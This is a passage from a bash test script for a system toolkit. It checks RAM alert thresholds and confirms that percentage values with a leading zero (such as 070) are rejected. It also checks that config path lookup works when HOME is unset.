if TOOLKIT_CONFIG_DIR="${CFG_TMP2}/info-low" "${BIN_DIR}/info" >/tmp/toolkit_test_info_lowram.out 2>/tmp/toolkit_test_info_lowram.err; then
    if grep -q "RAM usage is" /tmp/toolkit_test_info_lowram.out; then
        ok "info fires a RAM alert when the configured threshold (1%) is below actual usage"
    else
        bad "info did not fire a RAM alert with RAM_ALERT_PCT=1 (actual RAM usage should always exceed 1%)"
    fi
else
    bad "info exited non-zero with a config file present: $(cat /tmp/toolkit_test_info_lowram.err)"
fi

echo "== configuration engine: info's default RAM alert threshold is unchanged without a config file =="
actual_ram_pct="$(bash -c '
    source "'"${LIB_DIR}"'/common.sh"
    source "'"${LIB_DIR}"'/system.sh"
    read -r _ _ pct <<<"$(get_ram_stats)"
    printf "%s" "${pct%\%}"
')"
if TOOLKIT_CONFIG_DIR="${CFG_TMP2}/does-not-exist" "${BIN_DIR}/info" >/tmp/toolkit_test_info_nocfg.out 2>/tmp/toolkit_test_info_nocfg.err; then
    expect_alert=0
    [[ "$actual_ram_pct" =~ ^[0-9]+$ ]] && [[ "$actual_ram_pct" -ge 90 ]] && expect_alert=1
    found_alert=0
    grep -q "RAM usage is" /tmp/toolkit_test_info_nocfg.out && found_alert=1
    if [[ "$expect_alert" -eq "$found_alert" ]]; then
        ok "info's default RAM alert threshold (90%) is unchanged without a config file"
    else
        bad "info's default RAM alert behavior changed (actual RAM ${actual_ram_pct}%, alert present: ${found_alert})"
    fi
else
    bad "info exited non-zero with no config file: $(cat /tmp/toolkit_test_info_nocfg.err)"
fi
rm -rf "$CFG_TMP2"

echo "== configuration engine: RAM_ALERT_PCT=070 is rejected, not silently reinterpreted as octal 56 =="
CFG_TMP3="$(mktemp -d)"
mkdir -p "${CFG_TMP3}/octal070"
printf 'RAM_ALERT_PCT=070\n' > "${CFG_TMP3}/octal070/config"
chmod 600 "${CFG_TMP3}/octal070/config"
result="$(TOOLKIT_CONFIG_DIR="${CFG_TMP3}/octal070" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get RAM_ALERT_PCT 90 percentage
' 2>"${CFG_TMP3}/octal070.err")"
if [[ "$result" == "90" ]] && grep -qi "invalid" "${CFG_TMP3}/octal070.err"; then
    ok "RAM_ALERT_PCT=070 is rejected and falls back to the default (90), not silently reinterpreted as octal 56"
else
    bad "RAM_ALERT_PCT=070 was not handled safely (got '$result', stderr: $(cat "${CFG_TMP3}/octal070.err"))"
fi

echo "== configuration engine: RAM_ALERT_PCT=080 falls back cleanly, no raw bash arithmetic error leaks to stderr =="
mkdir -p "${CFG_TMP3}/octal080"
printf 'RAM_ALERT_PCT=080\n' > "${CFG_TMP3}/octal080/config"
chmod 600 "${CFG_TMP3}/octal080/config"
result="$(TOOLKIT_CONFIG_DIR="${CFG_TMP3}/octal080" bash -c '
    source "'"${LIB_DIR}"'/config.sh"
    config_get RAM_ALERT_PCT 90 percentage
' 2>"${CFG_TMP3}/octal080.err")"
if [[ "$result" == "90" ]] && ! grep -qi "too great\|base" "${CFG_TMP3}/octal080.err"; then
    ok "RAM_ALERT_PCT=080 falls back to the default (90) with no raw bash arithmetic error in stderr"
else
    bad "RAM_ALERT_PCT=080 leaked a raw error or did not fall back correctly (got '$result', stderr: $(cat "${CFG_TMP3}/octal080.err"))"
fi

echo "== configuration engine: config_path does not crash when HOME and XDG_CONFIG_HOME are both unset =="
unset_home_err="${CFG_TMP3}/unset_home.err"
if env -u HOME -u XDG_CONFIG_HOME -u TOOLKIT_CONFIG_DIR bash -c '
    set -u
    source "'"${LIB_DIR}"'/config.sh"
    config_path >/dev/null
' 2>"$unset_home_err"; then
    if grep -qi "unbound variable" "$unset_home_err"; then
        bad "config_path raised an unbound variable error with HOME and XDG_CONFIG_HOME both unset: $(cat "$unset_home_err")"
    else
        ok "config_path does not crash when HOME and XDG_CONFIG_HOME are both unset (under set -u)"
    fi
else
    bad "config_path exited non-zero with HOME and XDG_CONFIG_HOME both unset: $(cat "$unset_home_err")"
fi

rm -rf "$CFG_TMP3"

echo
echo "Results: ${pass} passed, ${fail} failed"
[[ "$fail" -eq 0 ]]
